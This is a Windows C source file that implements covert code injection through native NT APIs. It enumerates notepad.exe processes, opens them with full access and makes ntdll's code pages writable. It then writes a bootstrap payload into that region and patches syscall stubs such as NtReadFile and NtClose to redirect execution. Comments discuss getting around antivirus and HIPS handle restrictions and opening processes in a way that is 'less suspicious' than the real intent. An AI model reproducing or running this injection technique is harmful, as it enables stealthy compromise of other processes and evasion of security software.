#include "global.h"

#define INIT_PROCESS_NAME L"notepad.exe"
#define NT_SYSCALL_START 0x0	///System call numbers always started with 0.
#define NT_SYSCALL_END 0x1000	///0x1000 is the begin of win32k system calls and hence, the last possible NT syscall is 0xFFF.

///We define a generic system call structure which held true ever since Windows NT 3.51.
typedef struct _NT_SYSCALL_STUB {
	BYTE movR64Rcx[3];
	BYTE movR32Imm32;
	ULONG syscallNumber;
	USHORT intelSyscallInstruction;
	BYTE ret;
	BYTE nopPadding[5];
} NT_SYSCALL_STUB, *PNT_SYSCALL_STUB;

static char pZeroBuf[3 * 1024];

//void dispError(NTSTATUS status) {
//	ULONGLONG dummy;
//	for (ULONG i = NT_SYSCALL_START; i < NT_SYSCALL_END; i++) {
//		dummy = 0;
//		syscallStub(i, status, 1, 0, (PULONG_PTR)&dummy, 0, (PULONG)&dummy);
//	}
//}
void dispError(NTSTATUS status) {
	ULONGLONG dummy;
	dummy = 0;
	NtRaiseHardError(status, 1, 0, (PULONG_PTR)&dummy, 0, (PULONG)&dummy);
}

///Pretty self explaining... one provides a valid RVA and a base address corresponding to an on-disk image
///and gets a pointer to the file offset which at the same time is a valid pointer into the on-disk like
///memory buffer.
PVOID rvaToFileOffset(_In_ ULONG rva, _In_ PVOID pMemoryBase) {
	PIMAGE_NT_HEADERS pNtdllPeHdr = (PIMAGE_NT_HEADERS)((PUCHAR)pMemoryBase + ((PIMAGE_DOS_HEADER)pMemoryBase)->e_lfanew);
	PIMAGE_SECTION_HEADER pFirstSecHdr = IMAGE_FIRST_SECTION(pNtdllPeHdr);
	for (ULONG i = 0; i < pNtdllPeHdr->FileHeader.NumberOfSections; i++) {
		if ((pFirstSecHdr[i].VirtualAddress <= rva) && (rva < pFirstSecHdr[i].VirtualAddress + pFirstSecHdr[i].Misc.VirtualSize))
			return  (PUCHAR)pMemoryBase + rva + pFirstSecHdr[i].PointerToRawData - pFirstSecHdr[i].VirtualAddress;
	}
	return NULL;
}

#define MIN_VM_ACCESS_MASK ( PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION)

NTSTATUS injectIntoProcess(HANDLE hProcess, ULONGLONG injectionHookAddress, DWORD timeoutMilliseconds){
	LARGE_INTEGER interval;
	SIZE_T bytesWritten;
	ULONG oldHookProtect = 0x0;
	PVOID pNtdllRxBegin = NULL;
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	ULONGLONG payloadAddress;
	SIZE_T bytesToProtect = PAGE_SIZE;
	NT_SYSCALL_STUB originalSyscallStub = *(PNT_SYSCALL_STUB)injectionHookAddress;
	ULONG callDisplacement;
	unsigned char pReadBuffer[8];

	interval.QuadPart = timeoutMilliseconds * (long long)(-10000);
	do {
		bytesToProtect = 1008 * 1024;
		pNtdllRxBegin = (PVOID)(0x1000 + (ULONGLONG)((PLDR_DATA_TABLE_ENTRY)((PLDR_DATA_TABLE_ENTRY)NtCurrentPeb()->Ldr->InLoadOrderModuleList.Flink)->InLoadOrderLinks.Flink)->DllBase);
		payloadAddress = (ULONGLONG)pNtdllRxBegin + bytesToProtect - 3 * 1024;
		callDisplacement = (ULONG)(payloadAddress - injectionHookAddress - 5);
		*(PULONG)((PUCHAR)&injectionCode + 1) = callDisplacement;
		originalSyscallCode = *(PULONG_PTR)injectionHookAddress;
		ntCreateThreadExNumber = ((PNT_SYSCALL_STUB)NtCreateThreadEx)->syscallNumber;
		ntProtectVirtMemNumber = ((PNT_SYSCALL_STUB)NtProtectVirtualMemory)->syscallNumber;
		ldrInitializeThunkAddr = (ULONG_PTR)&LdrInitializeThunk;
		protSize = bytesToProtect;
		ntdllRxBaseAddr = (ULONG_PTR)pNtdllRxBegin;
		
		status = NtProtectVirtualMemory(hProcess, &pNtdllRxBegin, &bytesToProtect, PAGE_EXECUTE_READWRITE, &oldHookProtect);
		if (status)
			break;
		origProt = oldHookProtect;
		status = NtWriteVirtualMemory(hProcess, (PVOID)payloadAddress, &bootstrapRoutineBegin, (SIZE_T)&bootstrapRoutineEnd - (SIZE_T)&bootstrapRoutineBegin, &bytesWritten);
		if (status)
			break;

		NtSuspendProcess(hProcess);
		status = NtWriteVirtualMemory(hProcess, (PVOID)injectionHookAddress, &injectionCode, sizeof(ULONG_PTR), &bytesWritten);
		NtResumeProcess(hProcess);
		if (status)
			break;

		NtDelayExecution(FALSE, &interval);

		status = NtReadVirtualMemory(hProcess, (PVOID)injectionHookAddress, pReadBuffer, sizeof(pReadBuffer), &bytesWritten);
		if (status)
			break;

		if (mymemcmp(pReadBuffer, &injectionCode, sizeof(pReadBuffer))){
			NtSuspendProcess(hProcess);
			NtWriteVirtualMemory(hProcess, (PVOID)injectionHookAddress, &originalSyscallStub, sizeof(NT_SYSCALL_STUB), &bytesWritten);
			NtResumeProcess(hProcess);

			//for (int i = 0; i < ((SIZE_T)&bootstrapRoutineEnd - (SIZE_T)&bootstrapRoutineBegin); i++)
				//(&bootstrapRoutineBegin)[i] = 0x0;
			NtWriteVirtualMemory(hProcess, (PVOID)payloadAddress, pZeroBuf, sizeof(pZeroBuf), &bytesWritten);
			NtProtectVirtualMemory(hProcess, &pNtdllRxBegin, &bytesToProtect, oldHookProtect, &oldHookProtect);
			status = STATUS_UNSUCCESSFUL;
			break;
		}
	} while (status);

	//if (oldHookProtect)
		

	//if(oldPayloadProtect)
	//	NtProtectVirtualMemory(hProcess, &pPayloadBase, &bytesToProtect, oldPayloadProtect, &oldPayloadProtect);



	//if (status)
	//	dispError(status);

	return status;
}

NTSTATUS openProcsByName(PHANDLE pProcess, PUNICODE_STRING pProcName, BOOLEAN useDebugPrivilege) {
	SYSTEM_PROCESS_INFORMATION procInfo;
	//OBJECT_ATTRIBUTES procAttr;
	//OBJECT_BASIC_INFORMATION processHandleInfo;
	CLIENT_ID cid;
	BOOLEAN oldValue;
	HANDLE pid;

	NTSTATUS status = STATUS_CACHE_PAGE_LOCKED;
	ULONG procListSize = 0;
	ULONGLONG memSize = 0;
	//ULONG obQueryLen = 0;
	PVOID pProcListHead = NULL;
	PSYSTEM_PROCESS_INFORMATION pProcEntry = NULL;
	HANDLE hProcess = NULL;

	if (!pProcName || !pProcess )
		return STATUS_INVALID_PARAMETER;

	*pProcess = NULL;

	///Since we specify a buffer size of 0 the buffer must overflow for sure even if there was running a
	///single process only. If we don't receive the dedicated error, something other has gone wrong
	///and we cannot rely on the return length.
	status = NtQuerySystemInformation(SystemProcessInformation, &procInfo, procListSize, &procListSize);
	if (STATUS_INFO_LENGTH_MISMATCH != status)
		return status;

	memSize = PAGE_ROUND_UP(procListSize) + PAGE_SIZE; ///We better allocate one page extra
													   ///since between our "test" call and the real call below
													   ///additional processes might be started. (race condition)
	status = NtAllocateVirtualMemory(INVALID_HANDLE_VALUE, &pProcListHead, 0, &memSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (status)
		return status;

	//status = NtAllocateVirtualMemory(INVALID_HANDLE_VALUE, (PVOID*)ppHandleTable, 0, &memSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	//if (status)
	//	return status;
	///By now, we have allocated a buffer large enough for the complete process list,
	///even if some new processes have been started in the mean time.
	///Hence, the next call is entirely expected to succeed.
	procListSize = (ULONG)memSize;
	status = NtQuerySystemInformation(SystemProcessInformation, pProcListHead, procListSize, &procListSize);
	if (status) {
		memSize = 0;
		NtFreeVirtualMemory(INVALID_HANDLE_VALUE, &pProcListHead, &memSize, MEM_RELEASE);
		return status;
	}

	OBJECT_ATTRIBUTES procAtttr;
	InitializeObjectAttributes(&procAtttr, NULL, 0, NULL, NULL);
	pid = NULL;
	cid.UniqueProcess = NULL;
	cid.UniqueThread = NULL;
	pProcEntry = pProcListHead;             ///The list of all system processes is a so called singly linked list.

	if (useDebugPrivilege) {
		status = RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &oldValue);
		if (status)         ///Since we're for some reason supposed to use the SeDebugPrivilege,
			return status;  ///we fail deliberately if we can't enable it. 
	}
	while (pProcEntry->NextEntryOffset) { ///If NextEntryOffset member is NULL, we have reached the list end (tail).
		pProcEntry = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)pProcEntry + pProcEntry->NextEntryOffset);
		//DebugPrint2A("PID: %d, %wZ", pProcEntry->UniqueProcessId, pProcEntry->ImageName);
		if (0 == RtlCompareUnicodeString(pProcName, &pProcEntry->ImageName, TRUE)) {
			cid.UniqueProcess = pProcEntry->UniqueProcessId;
			status = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &procAtttr, &cid);
			if (status)
				continue;

			status = injectIntoProcess(hProcess, (ULONGLONG)&NtReadFile, 3000);
			if (!status) {
				NtClose(hProcess);
				break;
			}
			status = injectIntoProcess(hProcess, (ULONGLONG)&NtClose, 3000);
			if (!status) {
				NtClose(hProcess);
				break;
			}
			status = injectIntoProcess(hProcess, (ULONGLONG)&NtQueryValueKey, 3000);
			NtClose(hProcess);
			if (!status)
				break;
		}
	}

	memSize = 0;
	NtFreeVirtualMemory(INVALID_HANDLE_VALUE, &pProcListHead, &memSize, MEM_RELEASE); ///We don't need the list anymore.

	if (!cid.UniqueProcess)
		return STATUS_OBJECT_NAME_NOT_FOUND;

	////DebugPrint2A("%wZ pid = %llu", *pProcName, pid);



	//InitializeObjectAttributes(&procAttr, NULL, 0, NULL, NULL);
	//cid.UniqueThread = (HANDLE)0;
	//cid.UniqueProcess = pid;
	/////Opening a process for full access might be less suspicious than opening with our real intentions.
	//status = NtOpenProcess(pProcess, PROCESS_ALL_ACCESS, &procAttr, &cid);

	if (useDebugPrivilege)
		///We don't have any clue if the privilege already was enabled,
		///so we simply restore the old status. Whether we do this call or not 
		///isn't anyhow related to the result of process opening.
		RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, oldValue, FALSE, &oldValue);

	//if (status)
	//	return status;   ///Most likely STATUS_ACCESS_DENIED if
	//					 ///either we didn't specify the useDebugPrivilege flag when opening a cross session process
	//					 ///or if we tried to open an elevated process while running non-elevated.

	//					 ///In x64 windows, HIPS or AV drivers have the possibility to legally
	//					 ///receive a notification if a process is about to open a handle to another process.
	//					 ///In those ObCallback routines they cannot completely deny the opening.
	//					 ///However, they are able to modify the access masks, so a handle supposed for VM operations still
	//					 ///will be lacking the PROCESS_VM_XXX rights, for example. If we therefore query the handle rights
	//					 ///we can still return an appropriate error if wasn't granted the rights we want
	//					 ///And are not going to fail at first when performing our process operations.
	//status = NtQueryObject(*pProcess, ObjectBasicInformation, &processHandleInfo, sizeof(OBJECT_BASIC_INFORMATION), &obQueryLen);
	//if (status) {    ///Not sure if this call ever will fail...
	//	NtClose(*pProcess);
	//	*pProcess = NULL;
	//	return status;
	//}

	/////Maybe, HIPS just wanted to deny PROCESS_TERMINATE/PROCESS_SUSPEND right?
	/////If so, we don't care. We're only interested in VM rights.
	//if (MIN_VM_ACCESS_MASK & ~processHandleInfo.GrantedAccess) {
	//	NtClose(*pProcess);
	//	*pProcess = NULL;
	//	return STATUS_UNSUCCESSFUL;
	//}

	return status;
}


void mymain(void){
	NTSTATUS status = STATUS_PENDING;
	HANDLE hProcess = INVALID_HANDLE_VALUE;
	UNICODE_STRING uProcess;
	OBJECT_ATTRIBUTES thrdAttr;
	//CLIENT_ID cid;
	//HANDLE hCompletion = INVALID_HANDLE_VALUE;
	OBJECT_ATTRIBUTES completionAttr;
	//SIZE_T memSize = 0;
	LARGE_INTEGER interval;
	//PHANDLE pPidList = NULL;

	uProcess.Buffer = INIT_PROCESS_NAME;
	uProcess.Length = sizeof(INIT_PROCESS_NAME) - sizeof(UNICODE_NULL);
	uProcess.MaximumLength = sizeof(INIT_PROCESS_NAME);
	InitializeObjectAttributes(&thrdAttr, NULL, 0, NULL, NULL);
	InitializeObjectAttributes(&completionAttr, NULL, 0, NULL, NULL);
	///The requested operation waits until you click a button.
	dispError(STATUS_PENDING);
	interval.QuadPart = -20000000;
	do {
		//do {
			status = openProcsByName(&hProcess, &uProcess, FALSE);
			//NtDelayExecution(FALSE, &interval);
		//} while (!status);

		dispError(status);
		if (status)
			break;
		////NtTimer
		////if (status)
		////	break;
		//
		////NtGetC
		//cid.UniqueProcess = (HANDLE)5836;
		//cid.UniqueThread = (HANDLE)5840;
		//status = NtCreateIoCompletion(&hCompletion, IO_COMPLETION_ALL_ACCESS, &completionAttr, 2);
		//if (status)
		//	break;
		//
		//status = NtCreateWorkerFactory(&hProcess, SYNCHRONIZE, &completionAttr, hCompletion, INVALID_HANDLE_VALUE, (PUCHAR)RtlSetProcessIsCritical+3, (PVOID)NtAcceptConnectPort, 70, 1024*PAGE_SIZE, PAGE_SIZE);
		//if (status)
		//	break;
		//////status = NtGetNextThread(hProcess, NULL, THREAD_ALL_ACCESS, OBJ_CASE_INSENSITIVE, 0, &hProcess);
		//////status = NtOpenThread(&hProcess, THREAD_ALL_ACCESS, &thrdAttr, &cid);
		////
		//////status = NtQueueApcThreadEx(hProcess, NULL, (PVOID)RtlSetProcessIsCritical, NULL, NULL, NULL);
		////if (status)
		////	break;

		//dispError(STATUS_XML_ENCODING_MISMATCH);
	} while (status);
	
	//if (*pPidList)
	//	NtFreeVirtualMemory(INVALID_HANDLE_VALUE, &pPidList, &memSize, MEM_RELEASE);

	//if (status)
	//	dispError(status);

	//dispError(status);


	//NtQueueApcThreadEx()
	//rvaToFileOffset()
	////selfUnmap();
	/////No image (except the own one) can be found...
	////dispError(STATUS_SECTION_NOT_IMAGE);

	/////Initialize everything...
	////status = initializeSyscallTable();
	////if (status) {
	////	dispError(status);
	////	return;
	////}

	/////...and demonstrate that we have hopefully succeeded.
	////status = testNtapiTable();
	////if (status)
	////	dispError(status);
}

//void testRoutine(void) {
//	ULONG_PTR dummyVar;
//	&dummyVar;
//}